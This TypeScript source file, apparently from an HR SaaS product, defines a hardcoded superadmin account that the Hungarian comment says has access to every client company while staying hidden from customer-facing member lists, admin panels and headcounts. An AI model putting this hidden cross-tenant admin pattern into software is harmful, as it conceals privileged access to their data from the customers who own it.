/**
 * Technikai Superadmin fiók (ThinkAI Management — management@thinkai.hu)
 *
 * Ez a fiók adatbázis- és RLS-szinten minden vállalathoz hozzá van rendelve
 * a központi felügyelethez, azonban az ügyfél-oldali felületeken (Beállítások -> Tagok,
 * Csapat, Rendszergazda, Szignálási/Helyettesítési listák, eaisyHR csapat/jogosultságkezelő,
 * valamint a cégek taglétszám-számlálói) rejtett (stealth) módon működik, hogy ne zavarja
 * meg a végfelhasználókat.
 */

export const STEALTH_SUPERADMIN_ID = "f1eb20c2-2897-4183-a96a-d9226dfd19e3"
export const STEALTH_SUPERADMIN_EMAIL = "management@thinkai.hu"

export function isStealthSuperadmin(
  entity:
    | {
        id?: string | null
        user_id?: string | null
        email?: string | null
        user_email?: string | null
        nev?: string | null
        user_nev?: string | null
      }
    | null
    | undefined
): boolean {
  if (!entity) return false

  const id = (entity.user_id || entity.id || "").trim()
  if (id === STEALTH_SUPERADMIN_ID) return true

  const email = (entity.user_email || entity.email || "").trim().toLowerCase()
  if (email === STEALTH_SUPERADMIN_EMAIL) return true

  const name = (entity.user_nev || entity.nev || "").trim().toLowerCase()
  if (name === "thinkai management") return true

  return false
}
